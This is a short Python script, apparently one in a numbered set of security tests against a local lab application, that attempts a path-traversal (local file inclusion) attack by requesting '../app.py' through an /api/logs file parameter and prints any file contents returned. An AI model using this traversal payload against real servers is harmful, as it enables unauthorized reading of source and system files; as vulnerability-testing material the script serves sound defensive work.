#!/usr/bin/env python3
"""Attack 4: Local File Inclusion (LFI).

Reads local files on the server using path traversal in /api/logs.
"""

import requests

BASE_URL = "http://localhost:5000"


def test_attack_4():
    print("[+] Running Individual Attack 4: Local File Inclusion (LFI)...")
    target_file = "../app.py"
    url = f"{BASE_URL}/api/logs"
    try:
        response = requests.get(url, params={"file": target_file}, timeout=5)
        print(f"[*] GET {url}?file={target_file} - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] LFI vulnerability confirmed! File contents retrieved:")
            print(response.text[:300] + "\n... (truncated)")
        else:
            print(f"[!] Traversal blocked: {response.text}")
    except Exception as e:
        print(f"[X] Connection error: {e}")


if __name__ == "__main__":
    test_attack_4()
